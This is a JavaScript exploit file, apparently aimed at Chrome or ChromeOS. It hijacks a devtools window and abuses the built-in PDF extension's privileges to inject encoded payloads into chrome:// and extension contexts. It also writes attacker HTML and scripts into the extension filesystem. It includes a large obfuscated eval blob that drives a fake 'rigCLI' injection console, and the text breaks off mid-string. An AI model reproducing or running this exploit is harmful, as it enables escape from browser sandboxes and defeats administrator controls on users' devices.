(function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`%%EXTJS%%`))
                    const url = await writeFile('index.html', `${atob('%%EXTHTML%%')}<script src="./index.js"></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);

            }
            document.open();
            document.write(atob(`%%HTMLENTRY%%`));
            function decode(str) {
    return decodeURIComponent(atob(str).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
}
        eval(decode("bGV0IHNsZWVwID0gbXMgPT4gbmV3IFByb21pc2UociA9PiBzZXRUaW1lb3V0KHIsIG1zKSk7CmxldCBtYWluZGwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibWFpbiIpCmxldCBjc2wgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29uc29sZSIpCmxldCBkbGlucHJvZ3Jlc3MgPSBmYWxzZQpjc2wuaW5uZXJIVE1MID0gIiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZsdDsuLi4uLi4uLi4uLi4uLi4uJmd0Ozxicj48YnI+PGJyPiIKCgphc3luYyBmdW5jdGlvbiByb3RhbmltYXRlKGVsZW0pewoKICAgIGxldCBhbmltID0gWyLioIciLCAi4qCLIiwgIuKgiSIsICLioJkiLCAi4qC4IiwgIuKgtCIsICLioKQiLCAi4qCmIl0KICAgIGxldCBpID0gMDsKICAgIHdoaWxlIChkbGlucHJvZ3Jlc3MpewogICAgICAgIC8vIHdpbmRvdy5hbGVydChlbGVtLmlubmVySFRNTCkKICAgICAgICBlbGVtLmlubmVySFRNTD0nPGIgc3R5bGU9ImZvbnQtc2l6ZToyNXB4OyI+WzxzcGFuIHN0eWxlPSJjb2xvcjpsaW1lIj4nK2FuaW1baSVhbmltLmxlbmd0aF0rJzwvc3Bhbj5dPC9iPicKICAgICAgICBpKysKICAgICAgICAKICAgICAgICBhd2FpdCBzbGVlcCgyNTApCiAgICB9CiAgICBlbGVtLmlubmVySFRNTD0nPGIgc3R5bGU9ImZvbnQtc2l6ZToyNXB4OyI+WzxzcGFuIHN0eWxlPSJjb2xvcjpsaW1lIj7ilog8L3NwYW4+XTwvYj4nCiAgICByZXR1cm47Cn0KYXN5bmMgZnVuY3Rpb24gZmlsZWFuaW1hdGUoZWxlbSl7CiAgICB0cnkgewogICAgICAgIGxldCB1cGRhdGVmaWxlcyA9IFsgICAgICJAN3lXMms5SzAyL2xhdGVzdC9yaWcvdXNlcmludGVyZmFjZS5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9yaWcvYXBpLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9yaWcvbWFpbi5qc3giLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy9jb25maWcuanNvbiIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL3V0aWxzLmpzbSIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL3N0eWxlcy5jc3MiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy9kYXNoYm9hcmQuaHRtbCIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL2xvZ2luLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy9sb2dvdXQucGhwIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9yaWcvcmVnaXN0ZXIuaHRtbCIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL2FwaS1oZWxwZXJzLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9yaWcvZm9ybXMuanN4IiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9yaWcvcmVwb3J0cy5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9yaWcvc2V0dGluZ3MuanNvbiIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvdXRpbGl0eS9zeXN0ZW0tc2Nhbi5leGUiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvZGlzay1jbGVhbmVyLmV4ZWMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvYmFja3VwLXRvb2wuemlwIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L25ldHdvcmstbW9uaXRvci5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvdXRpbGl0eS9yZXNvdXJjZS1vcHRpbWl6ZXIudG9tcCIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvdXRpbGl0eS9maWxlLWNvbXByZXNzb3IuYXJjIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L3RlbXBlcmF0dXJlLW1vbml0b3IuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy9jb21wb25lbnQtbGlicmFyeS5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL2RlYnVnLXRvb2xzLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy90ZXN0LXN1aXRlLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9yaWcvdmVyc2lvbi1jb250cm9sLmpzb24iLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy9hbmFseXRpY3MuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy90b2RvLWxpc3QuanN4IiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9jaGF0Lmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvZmlsZS1jbGVhbmVyLmV4ZSIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvdXRpbGl0eS9zeXN0ZW0tb3B0aW1pemVyLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L25ldHdvcmstc3BlZWQtdGVzdC5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9lcnJvci1sb2dzLmpzb24iLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2RyaXZlcnMvY29uZmlndXJhdGlvbi54bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2RyaXZlcnMvc2NoZWR1bGVyLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L2ZpbGUtc3luY2hyb25pemVyLnppcCIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvdXRpbGl0eS9wcm9jZXNzLW1vbml0b3IuZXhlIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9zeXN0ZW0vbm90aWZpY2F0aW9uLWNlbnRlci5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9tZWRpYS1wbGF5ZXIuanN4IiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9zeXN0ZW0vcGVybWlzc2lvbnMuanNvbiIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvdXRpbGl0eS9hcHAtbGF1bmNoZXIuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2ZhcS5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9zdWRvLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2Vwb3h5LXYyLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9zeXN0ZW0vc2VjdXJpdHkuanNvbiIsICAgICAiQDd5VzJrOUswMi9sYXRlc3Qvc3lzdGVtL2Vycm9yLWhhbmRsZXIuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvZmlsZS1hcmNoaXZlci56aXAiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3N5c3RlbS9zZXNzaW9uLWxvZy54bWwiLCAgICAgCiAgICAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvZHJpdmVyLXVwZGF0ZXIuZXhlYyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvYXBwbGljYXRpb24vZGF0YS1pbXBvcnQuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvc3lzdGVtLWFuYWx5emVyLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9hY3Rpdml0eS1sb2dzLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL3Rhc2stbWFuYWdlci5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L3N0b3JhZ2UtYW5hbHl6ZXIuZXhlIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9zeXN0ZW0vdXBkYXRlLXRvb2wuanNtIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi92aXJ0dWFsY29tLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2Fsb2EvdmVyc2lvbi1oaXN0b3J5Lmpzb24iLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2Fsb2EvZGF0YS12aXN1YWxpemF0aW9uLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hbG9hL3Byb2ZpbGUtc2V0dGluZ3MuaHRtbCIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvYWxvYS9hcHBsaWNhdGlvbi5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvdXRpbGl0eS9sb2ctYW5hbHl6ZXIuZXhlYyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvYXBwbGljYXRpb24vbm90aWZpY2F0aW9uLXNldHRpbmdzLmpzb24iLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2JhY2t1cC1zY2hlZHVsZXIueG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcGkvYXBpLmpzb24iLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvYmFuZHdpZHRoLW1vbml0b3IuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL3VzZXIuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2V4dGVybmFsLWFwaS5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL3N5bnRheC5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL2NvZGUtZWRpdG9yLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy9kZXBsb3ltZW50LXNjcmlwdC5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvYXBwbGljYXRpb24vcmVsZWFzZS1ub3Rlcy5qc29uIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9idWctdHJhY2tlci5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L3N5c3RlbS1jaGVja2VyLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9wZXJmb3JtYW5jZS1kYXNoYm9hcmQuaHRtbCIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL3NlY3VyaXR5LWF1ZGl0LmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9zeXNkb21lL3RoaXJkLXBhcnR5LWludGVncmF0aW9uLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL3RlbXBsYXRlLWdlbmVyYXRvci5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvYXBwbGljYXRpb24vY29udGVudC1tYW5hZ2VtZW50Lmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2FwaS10ZXN0aW5nLXRvb2wuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2luc2lnaHQtZGFzaGJvYXJkLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2RhdGEtbWlncmF0aW9uLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi91c2FnZS1zdGF0cy5qc29uIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L2NvbW1vbkpTLmV4ZWMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL21hcmtldHBsYWNlLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL3VzZXItbWFuYWdlbWVudC5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L2NvZGUtbGludGVyLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9pc3N1ZS10cmFja2VyLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2RhdGEtc3luY2hyb25pemF0aW9uLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9yZWFsdGltZS1jb2xsYWJvcmF0aW9uLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2FwaS1yYXRlLWxpbWl0ZXIuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2V2ZW50LWxvZ2dlci5odG1sIiwgICAgIAogICAgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L3JlbW90ZS1hY2Nlc3MtdG9vbC5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvYXBwbGljYXRpb24vZmFxLW1hbmFnZXIuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2NvbnRlbnQtZm9ybWF0dGVyLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL2ludm9pY2UtZ2VuZXJhdG9yLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9hbmFseXRpY3MtZGFzaGJvYXJkLmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL3NjaGVkdWxpbmctdG9vbC5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvYXBwbGljYXRpb24vYXBpLWNsaWVudC5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL3dlYi1zY3JhcGVyLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L3JpZ2dlbi5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9jdXN0b21pemF0aW9uLXRvb2wuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL3Ryb3VibGVzaG9vdGluZy1ndWlkZS5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9yZXNvdXJjZS1tYW5hZ2VtZW50Lmh0bWwiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L2FwcGxpY2F0aW9uL3N5c3RlbS1yZXF1aXJlbWVudHMuanNvbiIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvYXBwbGljYXRpb24vZmFxLWFwaS5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvYXBwbGljYXRpb24vcmVwb3J0LWdlbmVyYXRvci5odG1sIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9hcHBsaWNhdGlvbi9hcGktY2hhbmdlbG9nLmpzb24iLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy9pbmplY3QuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy94c3MuZXhlYyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL21lbW9yeS1sZWFrLnN5cyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL2Nyb3Mta2VybmVsLWRldGVjdC5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL3BheWxvYWQtaW5qZWN0b3IuanN4IiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9yaWcvZXh0ZW5zaW9uLXNldHVwLmpzb24iLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy9tYW5pZmVzdHYyLmNudiIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL2V4dGVuc2lvbi56aXAiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvdW56aXBwZXIuZXhlYyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvdXRpbGl0eS90aHJlYWRlZC1leGVjLmpzcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL2tvbWFkby5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL2NodXJsLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC9yaWcvY2h1cmx2Mi5qcyIsICAgICAiQDd5VzJrOUswMi9sYXRlc3QvcmlnL2NsYXNzZXMuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvcmVhY3QtbmF0aXZlLmpzb24iLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvbnBtLmV4ZWMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvcGFja2FnZXMuanMiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3V0aWxpdHkvcGRsLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L3JlYWRlci5uZXQiLCAgICAgIkA3eVcyazlLMDIvbGF0ZXN0L3JpZy9jbGVhbnVwLmpzIiwgICAgICJAN3lXMms5SzAyL2xhdGVzdC91dGlsaXR5L3N5c3RlbXNldHVwLmV4ZWMiLCBdIAogICAgICAgIGxldCByZXBzID0gdXBkYXRlZmlsZXMubGVuZ3RoCiAgICAgICAgbGV0IHRvdGFsdGltZT0wCiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGk8PXJlcHMtMTsgaSsrKXsKICAgICAgICAgICAgbGV0IGluZGV4ID0gTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogKHVwZGF0ZWZpbGVzLmxlbmd0aCkpCiAgICAgICAgICAgIGVsZW0uaW5uZXJIVE1MKz0gdXBkYXRlZmlsZXNbaW5kZXhdKyI8YnI+IgogICAgICAgICAgICBtYWluZGwuc2Nyb2xsVG9wID0gbWFpbmRsLnNjcm9sbEhlaWdodAogICAgICAgICAgICB1cGRhdGVmaWxlcy5zcGxpY2UoaW5kZXgsIDEpCiAgICAgICAgICAgIGxldCBkZWxheSA9IE1hdGgucmFuZG9tKCkqMzAwCiAgICAgICAgICAgIHRvdGFsdGltZSA9IHRvdGFsdGltZSArIE51bWJlcihkZWxheS50b0ZpeGVkKDIpKS8xMDAwCiAgICAgICAgICAgIGF3YWl0IHNsZWVwKGRlbGF5LnRvRml4ZWQoMikpCiAgICAgICAgfQogICAgICAgIHRvdGFsdGltZSA9IHRvdGFsdGltZS50b0ZpeGVkKDIpCiAgICAgICAgCiAgICAgICAgZWxlbS5pbm5lckhUTUwrPWA8c3BhbiBzdHlsZT0nY29sb3I6bGltZSc+MjEgcGFja2FnZXMsIDEyNyBmaWxlcyBkb3dubG9hZGVkIGFuZCBhdWRpdGVkIGluICR7dG90YWx0aW1lfSBzZWNvbmRzYAogICAgICAgIGF3YWl0IHNsZWVwKDIwMDApCiAgICAgICAgZGxpbnByb2dyZXNzPWZhbHNlCiAgICB9IGNhdGNoKGVycil7d2luZG93LmFsZXJ0KGVycil9CiAgICAKfQoKCgpsZXQgbWFpbiA9IGFzeW5jIGZ1bmN0aW9uKCl7CiAgICBhd2FpdCBzbGVlcCg1MDApCiAgICBjc2wuaW5uZXJIVE1MID0gIiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZsdDs8c3BhbiBzdHlsZT0nY29sb3I6bGltZSc+cmlnQ0xJIDIuNiByZWFkeTwvc3Bhbj4mZ3Q7PGJyPiIKICAgIGNzbC5pbm5lckhUTUwgKz1gJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7QGN1cnRpbWUgWyR7bmV3IERhdGUoKX1dPGJyPmAKICAgIGNzbC5pbm5lckhUTUwgKz1gJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7QHVzZXIgWyR7bmF2aWdhdG9yLnVzZXJBZ2VudH1dPGJyPmAKICAgIGxldCBpbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0eHRpbnB1dCcpCiAgICBsZXQgcnVubmluZyA9IGZhbHNlCiAgICBpbnB1dC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgYXN5bmMgZnVuY3Rpb24oZXZlbnQpewogICAgICAgIGlmKGV2ZW50LmtleSA9PT0gIkVudGVyIiAmJiAhcnVubmluZyl7CiAgICAgICAgICAgIHJ1bm5pbmcgPSB0cnVlCiAgICAgICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCkKICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YCZndDske2lucHV0LnZhbHVlfTxicj5gCiAgICAgICAgICAgIGxldCBjbWQgPSBpbnB1dC52YWx1ZS50b0xvd2VyQ2FzZSgpCiAgICAgICAgICAgIAogICAgICAgICAgICBpbnB1dC52YWx1ZT0nJwogICAgICAgICAgICBtYWluZGwuc2Nyb2xsVG9wID0gbWFpbmRsLnNjcm9sbEhlaWdodDsKCgogICAgICAgICAgICBpZihjbWQuc3RhcnRzV2l0aCgiaW5qIikpewogICAgICAgICAgICAgICAgbGV0IHNwbCA9IGNtZC5zcGxpdCgnICcpCiAgICAgICAgICAgICAgICBsZXQgZmxhZ3MgPSB7fQogICAgICAgICAgICAgICAgc3BsLm1hcChhPT57CiAgICAgICAgICAgICAgICAgICAgaWYoYS5zdGFydHNXaXRoKCItLSIpKXsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoYS5pbmNsdWRlcygiPSIpKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsYWdzW2Euc3BsaXQoJy0tJykuam9pbignPScpLnNwbGl0KCc9JylbMV1dPWEuc3BsaXQoJy0tJykuam9pbignPScpLnNwbGl0KCc9JylbMl0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsYWdzW2Euc3BsaXQoJy0tJylbMV1dPXRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICBsZXQgcGF5bG9hZCA9IHNwbFtzcGwubGVuZ3RoLTFdCiAgICAgICAgICAgICAgICBpZihwYXlsb2FkLnN0YXJ0c1dpdGgoJy0tJykpewogICAgICAgICAgICAgICAgICAgIHBheWxvYWQ9JycKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKGZsYWdzLmV4dCAmJiBwYXlsb2FkKXsKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdyI+RWxldmF0aW5nIHRvIFske3BheWxvYWR9XSBjb250ZXguIEluamVjdGluZy4uLjwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDIwMCkKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOmxpbWUiPiDilog8L3NwYW4+YAogICAgICAgICAgICAgICAgICAgIGZvciAobGV0IHJlcCA9IDA7IHJlcDw5OyByZXArKyl7CiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKE1hdGgucmFuZG9tKCkqMzAwKQogICAgICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOmxpbWUiPiDilog8L3NwYW4+YAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPGJyPjxzcGFuIHN0eWxlPSJjb2xvcjpsaW1lIj5Eb25lITwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDIwMCkKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOmxpbWUiPk9wZW5pbmcgZWxldmF0ZWQgZGVidWcgd2luZG93PC9zcGFuPjxicj5gCiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2xlZXAoMjAwKQogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdleHRkYmcnKS5jbGljaygpCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYoZmxhZ3MuZGV2KXsKICAgICAgICAgICAgICAgICAgICBjc2wuaW5uZXJIVE1MKz1gPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdyI+RWxldmF0aW5nIHRvIFtjaHJvbWUuZGV2dG9vbHNdIGNvbnRleC4gSW5qZWN0aW5nLi4uPC9zcGFuPjxicj5gCiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2xlZXAoMjAwKQogICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwrPWA8c3BhbiBzdHlsZT0iY29sb3I6bGltZSI+IOKWiDwvc3Bhbj5gCiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgcmVwID0gMDsgcmVwPDk7IHJlcCsrKXsKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2xlZXAoTWF0aC5yYW5kb20oKSoxMCkKICAgICAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxzcGFuIHN0eWxlPSJjb2xvcjpsaW1lIj4g4paIPC9zcGFuPmAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY3NsLmlubmVySFRNTCs9YDxicj48c3BhbiBzdHlsZT0iY29sb3I6bGltZSI+RG9uZSE8L3NwYW4+PGJyPmAKICAgICAgICAgICAgICAgICAgICBhd2FpdCBzbGVlcCgxMDApCiAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RldmRiZycpLmNsaWNrKCkKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgaWYocGF5bG9hZCl7CiAgICAgICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwrPWA8c3BhbiBzdHlsZT0iY29sb3I6cmVkIj5FUlJPUjogcHJvdmlkZSBhdCBsZWFzdCBvbmUgdmFsaWQgZmxhZyAoLS1leHQsIC0tZGV2KTwvc3Bhbj48YnI+YAogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNzbC5pbm5lckhUTUwrPWA8c3BhbiBzdHlsZT0iY29s